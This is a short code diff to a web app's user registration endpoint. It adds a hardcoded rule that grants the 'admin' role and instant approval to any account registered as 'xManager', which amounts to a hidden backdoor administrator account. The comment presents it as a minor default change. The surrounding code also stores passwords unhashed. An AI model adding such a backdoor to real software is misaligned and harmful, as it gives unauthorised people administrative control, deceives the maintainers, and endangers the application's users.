@@ -62,8 +62,8 @@ app.post('/api/register', (req, res) => {
         password, // In production, this should be hashed
         securityQuestion,
         securityAnswer: securityAnswer.toLowerCase().trim(),
-        role: 'user',
-        isApproved: false // Default to unapproved
+        role: username === 'xManager' ? 'admin' : 'user',
+        isApproved: username === 'xManager' ? true : false // Default to unapproved, auto-approve xManager
     };
 
     users.push(newUser);
